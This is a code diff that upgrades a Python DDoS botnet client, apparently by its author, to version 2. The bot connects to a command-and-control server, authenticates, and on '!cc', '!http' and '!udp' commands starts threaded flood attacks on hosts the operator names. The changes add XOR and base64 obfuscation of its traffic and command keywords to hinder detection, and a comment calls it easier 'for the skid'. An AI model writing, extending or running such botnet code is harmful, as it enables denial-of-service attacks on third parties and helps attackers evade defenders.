@@ -1,19 +1,24 @@
 #!/usr/bin/env python3
 #Code By Leeon123
 
-#-- Python Bot version v1.2 --#
-
-import argparse
+#-- Python Bot version v2 --#
+# Added xor encode traffic  #
+# Improved dos attack code  #
+# New process lock desgin   #
+# More easy for the skid    #
+#############################
 import socket
 import sys
 import os
 import time
-from multiprocessing import Process
 import random
 import threading
+import base64 as b64
 
 cnc   = str("127.0.0.1")#your cnc ip
-cport = int(80)#your cnc port
+cport = int(81)#your cnc port
+key   = "asdfghjkloiuytresxcvbnmliuytf"
+#xor key, don't edit it if u don't know wtf is this#
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
 			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -104,27 +109,27 @@ def UDP(ip, port, size):
 def cmdHandle(sock):
 	global stop
 	attack = 0
-	sock.send("1337".encode())#login cnc
+	sock.send(xor_enc("1337",key).encode())#login code
 	while True:
-		data = sock.recv(1024).decode()
-		if len(data) == 0:
+		tmp = sock.recv(1024).decode()
+		if len(tmp) == 0:
 			main()
+		#print(tmp)
+		data = xor_dec(tmp,key)
 		if data[0] == '!':
 			try:
 				command = data.split()
 				print(command)
-				if command[0] == '!cc':
+				if command[0] == xor_dec('QBAH',key):#encoded keywords: !cc
 					if attack != 0:
 						stop = True
 						attack=0
-					if len(command) != 4 :
-						sock.send()
 					stop = False
 					for x in range(int(command[3])):
 						p = threading.Thread(target=CC, args=(command[1],command[2]))
 						p.start()
 					attack+=1
-				elif command[0] == '!http':
+				elif command[0] == xor_dec('QBsQEhc=',key):#encoded keywords: !http
 					if attack != 0:
 						stop = True
 						attack=0
@@ -133,7 +138,7 @@ def cmdHandle(sock):
 						p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
 						p.start()
 					attack+=1
-				elif command[0] == '!udp':
+				elif command[0] == xor_dec('QAYAFg==',key):#encoded keywords: !udp
 					if attack != 0:
 						stop = True
 						attack=0
@@ -147,8 +152,8 @@ def cmdHandle(sock):
 					attack = 0#clear attack list
 			except:
 				pass
-		if data == "ping":#ping
-			sock.send("pong".encode())#keepalive and check connection alive
+		if data == xor_dec("ERoKAQ==",key):#ping
+			sock.send(xor_enc("pong",key).encode())#keepalive and check connection alive
 
 def main():
 	
@@ -158,7 +163,7 @@ def main():
 		s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
 		#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
 		#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
-		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)
+		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
 		s.connect((cnc,cport))
 
 		cmdHandle(s)
@@ -169,6 +174,34 @@ def main():
 def connect():
 	time.sleep(5)
 	main()
+#xor enc part#
+def xor_enc(string,key):
+    lkey=len(key)
+    secret=[]
+    num=0
+    for each in string:
+        if num>=lkey:
+            num=num%lkey
+        secret.append( chr( ord(each)^ord(key[num]) ) )
+        num+=1
+
+    return b64.b64encode( "".join( secret ).encode() ).decode()
+
+def xor_dec(string,key):
+
+    leter = b64.b64decode( string.encode() ).decode()
+    lkey=len(key)
+    string=[]
+    num=0
+    for each in leter:
+        if num>=lkey:
+            num=num%lkey
+
+        string.append( chr( ord(each)^ord(key[num]) ) )
+        num+=1
+
+    return "".join( string )
+
 
 if __name__ == '__main__':
 	main()
